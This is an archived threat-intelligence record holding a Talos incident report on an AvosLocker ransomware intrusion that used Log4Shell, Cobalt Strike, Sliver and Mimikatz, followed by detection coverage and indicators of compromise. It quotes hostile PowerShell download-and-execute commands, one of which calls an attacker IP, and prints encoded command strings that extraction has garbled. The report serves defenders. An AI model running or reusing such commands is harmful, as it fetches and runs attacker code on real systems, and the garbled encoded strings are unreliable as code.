{
    "id": "fdce4047-261d-42d8-8067-14b1c299cb43",
    "created_at": "2023-01-12T14:59:55.203126Z",
    "updated_at": "2025-03-27T02:09:17.878145Z",
    "deleted_at": null,
    "sha1_hash": "d72a014d5d99692dadbb5c06ef999f0a084e9dea",
    "title": "2022-06-21 - Avos ransomware group expands with new attack arsenal",
    "authors": "",
    "file_creation_date": "2022-07-02T23:13:39Z",
    "file_modification_date": "2022-07-02T23:13:39Z",
    "file_size": 506832,
    "plain_text": "# Avos ransomware group expands with new attack arsenal\n\n**blog.talosintelligence.com/2022/06/avoslocker-new-arsenal.html**\n\nBy [Flavio Costa,](https://www.youtube.com/Fl%25C3%25A1vioCostaSeguran%25C3%25A7aDescomplicada) [Chris Neal and](https://twitter.com/g0jirasan) [Guilherme Venere.](https://twitter.com/gvenere)\n\nIn a recent customer engagement, we observed a month-long AvosLocker campaign.\n[The attackers utilized several different tools, including Cobalt Strike,](https://www.cobaltstrike.com/) [Sliver and multiple commercial network scanners.](https://github.com/BishopFox/sliver)\n[The initial ingress point in this incident was a pair of VMWare Horizon Unified Access Gateways that were vulnerable to Log4Shell. While](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)\nCisco products were deployed on the network, the appliances were never configured, allowing the attacker to gain access to internal\nservers and maintain a foothold.\nDuring the time the attacker was active in the network, several security events were detected by the security products but were not\nreviewed by the security team, which could have prevented the ransomware activity.\n\n## Threat Actor Profile: Avos\n\n[Avos is a ransomware group first identified in 2021 initially targeting Windows machines. More recently, a new ransomware variant of](https://blog.malwarebytes.com/threat-intelligence/2021/07/avoslocker-enters-the-ransomware-scene-asks-for-partners/)\nAvosLocker, named after the group, is also targeting Linux environments. Well-funded and financially motivated, Avos has been active since\n[June 2021 and follows the ransomware-as-a-service (RaaS) model, an affiliate program to recruit potential partners. The announcement of the](https://talosintelligence.com/podcasts/shows/talos_takes/episodes/57)\nprogram includes information about the features of the ransomware and lets affiliates know that AvosLocker operators will handle negotiation\nand extortion practices. The user \"Avos\" has also been observed trying to recruit individuals on the Russian forum XSS.\n\n\n-----\n\n## Initial vector\n\nTypically, Avos uses spam email campaigns as an initial infection vector to deliver ransomware. In this particular incident, however, the initial\nvector was an ESXi server exposed on the internet over VMWare Horizon Unified Access Gateways (UAG), which was vulnerable to the\nLog4Shell vulnerability. The customer notified Talos on March 7 2022, but noticed activity related to the ransomware attack as far back as Feb.\n7, 2022.\n\nSeveral vulnerabilities associated with Log4j, listed below, were found on this customer's UAG:\n\n[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3Dcve-2021-44228)\n[CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2021-45046)\n[CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2021-45105)\n[CVE-2021-44832](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2021-44832)\n\nThese vulnerabilities can potentially allow remote code execution on Unified Access Gateways by a low-privilege non-root user named\n\"gateway\". Beyond that, the inner-transit firewalls that could control or limit the access to the internal infrastructure were not configured, hence,\nthe attackers used it as the initial access to establish a foothold on the customer's network, granting access to their internal servers.\n\nThe victim in this case used Cisco Secure Endpoint (formerly known as Advanced Malware Protection) as its EPP/EDR solution on most\nendpoints, from workstations to servers, which allowed Talos to collect important information about the entire attack lifecycle.\n\n## Attack Timeline\n\nDuring the initial phases of the attack the threat actor made numerous steps to gain a foothold on the victim network. Several other payloads\nand malicious tools were observed on endpoints, along with the utilization of living-off-the-land binaries (LoLBins).\n\nTalos observed the attackers using the WMI Provider Host (wmiprvse.exe) on a Windows Server that was the initial point of entry to run an\nencoded PowerShell script using the DownloadString method at 01:41 UTC on Feb. 11.\n\nThree days later, on Feb. 14, a retrospective detection was triggered for the RuntimeBrokerService.exe executable in\n\"C:\\Windows\\System32\\temp\\\" for creating a file called \"watcher.exe.\" These particular files may be artifacts from a separate threat actor, as\nthese files appear to be related to a cryptocurrency miner rather than AvosLocker. It is not uncommon for a miner to be deployed alongside\nransomware in an attempt to passively increase revenue. However, there is significant evidence that multiple threat actors had compromised\nthis network, as [DarkComet samples unrelated to this campaign were also discovered.](https://malpedia.caad.fkie.fraunhofer.de/details/win.darkcomet)\n\nApproximately four weeks later on March 4, another encoded PowerShell command was executed, shown below, again utilizing the\nDownloadString method.\n\n\n-----\n\npo e s e e e e ec bypass e c\naQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUA\n\nDecoded:\n\niex (New-Object SystemNetWebClient)DownloadString('http://45[.]136[.]230[.]191:4000/D234R23');\n\nTwo days later on March 6, the attacker ran more PowerShell scripts to download and execute a Sliver payload labeled \"vmware_kb.exe\". As\n[seen in their blog post regarding Sliver, Team Cymru has observed the deployment of this executable in a similar campaign. In the following](https://team-cymru.com/blog/2022/05/03/sliver-case-study-assessing-common-offensive-security-tools/)\ndays, several PowerShell scripts downloaded additional files, including Mimikatz and a .zip archive called \"IIS Temporary Compressed\nFiles.zip\" containing Cobalt Strike beacons and a port scanner labeled \"scanner.exe.\" This port scanner is a commercially available product\n[which Avos is known for deploying called SoftPerfect Network Scanner. Later that same day, the attackers utilized WMIC to modify](https://www.softperfect.com/products/networkscanner/)\nadministrative settings on both a local and a remote host, behavior that is indicative of the first stages of lateral movement.\n\nAnother PowerShell command observed on March 6, shown below, is an artifact from a Cobalt Strike beacon executing its powershell-import\nfunction:\n\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAAAuAFcAZQBiAGMAbAbABpAGUAbgB0ACkALgBEAG8A\ndwBuAGwAbwAgAUQAUWB0AHIAAQBuAGcAKAAAGgAdAB0AAAOgAvAC8AMQAyADcALgAwAC4AMAAAAAAAAGAzADIANAA2AdcALwAnAC\n\nDecoded:\n\nIEX (New-Object NetWebclient)DownloadString('http://127.0.0.1:32467/')\n\nOn March 8, another instance of the SoftPerfect Network Scanner was transferred via AnyDesk to another server in the network. Later that\nday, the AvosLocker payload was finally delivered, using the victim's company name as the filename.\n\n[To proliferate the ransomware and other tools across the target network, the attackers used PDQ Deploy, a legitimate software deployment](https://www.pdq.com/pdq-deploy/)\ntool. Once the ransomware was delivered, the victims files were then encrypted and a ransom note was displayed, shown below.\n\n## Conclusion\n\nThis incident showcases the importance of ensuring that security appliances are properly set up and configured, updates and patches are\napplied and the security team is always monitoring alerts. While the attack techniques used in this campaign are not novel, they are still\neffective if the proper precautions are not in place.\n\nWith a highly motivated threat actor like Avos actively recruiting affiliates, these attacks are likely to proliferate in the future. Such attackers are\nconstantly hunting for vulnerable networks and can infiltrate them with relative ease, sometimes by multiple threat actors, as seen in this\nparticular case. A layered defense model is therefore imperative to detect, contain and protect against post-exploitation activity. While static\nand network-based detection is important, it should be complemented with properly configured system behavior analysis and endpoint\nprotections.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n\n-----\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\nEndpoint for free [here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nSecure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) Adaptive Security\nAppliance and [Meraki MX can detect malicious activity associated with this threat.](https://meraki.cisco.com/products/appliances)\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or](https://umbrella.cisco.com/)\n[off the corporate network. Sign up for a free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nbefore users access them.\n\n[Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on\n[Snort.org.](https://www.snort.org/products)\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this](https://orbital.amp.cisco.com/help/)\n[specific threat. For specific OSqueries on this threat, click here and](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/ransomware_avoslocker_filepath.yaml) [here.](https://github.com/Cisco-Talos/osquery_queries/blob/master/linux_malware/ransomware_avoslocker_filepath.yaml)\n\n## IoCs\n\n### AvosLocker\n\nffd933ad53f22a0f10cceb4986087258f72dffdd36999b7014c6b37c157ee45f\n\ncee38fd125aa3707DC77351dde129dba5e5aa978b9429ef3e09a95ebf127b46b\n\n\n-----\n\n### S e\n\n7f0deab21a3773295319e7a0afca1bea792943de0041e22523eb0d61a1c155e2\n\n### MimikatZ\n\ncac73029ad6a543b423822923967f4c240d02516fab34185c59067896ac6eb99\n29a3ae1d32e249d01b39520cd1db27aa980e646d83694ff078424bed60df9304\n\n63bdd396ff6397b3a17913badb7905c88e217d0a8cf864ab5e71cc174a4f97a1\n\n63ebb998ebbbfe3863214a85c388fc23b58af4492b2e96eb53c436360344d79d\n\n912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9\n\nf2faa8a91840de16efb8194182bcfa9919b74a2c2de40d6ed4791a3308897a01\n\n### Cobalt Strike artifacts\n\n**smb.ps1**\n\n48514e6bb92dd9e24a16a4ab1c7c3bd89dad76bef53cec2a671821024fadcb2b\n\n61239d726c92c82f553200ecbec3ac18d251902fb9ca4d4f52263c82374a5b75\n\n**beacon.ps1**\n\ne4af7f048e93b159e20cc3efbacdb68e3c1fb213324daf325268ccb71f6c3189\n\ne68f9c3314beee640cc32f08a8532aa8dcda613543c54a83680c21d7cd49ca0f\n\n### IIS Temporary Compressed Files.zip\n\n978dffa295ac822064ff6f7a6b6bc498e854f833d36633214d35ccce70db4819\n\n### URLs\n\nhxxp[://]45[.]136[.]230[.]191:4000/D234R23\n\n### IPs\n\n176[.]113[.]115[.]107\n\n45[.]136[.]230[.]191\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-21 - Avos ransomware group expands with new attack arsenal.pdf"
    ],
    "report_names": [
        "2022-06-21 - Avos ransomware group expands with new attack arsenal.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535595,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1656803619,
    "ts_modification_date": 1656803619,
    "files": {
        "pdf": "https://archive.orkl.eu/d72a014d5d99692dadbb5c06ef999f0a084e9dea.pdf",
        "text": "https://archive.orkl.eu/d72a014d5d99692dadbb5c06ef999f0a084e9dea.txt",
        "img": "https://archive.orkl.eu/d72a014d5d99692dadbb5c06ef999f0a084e9dea.jpg"
    }
}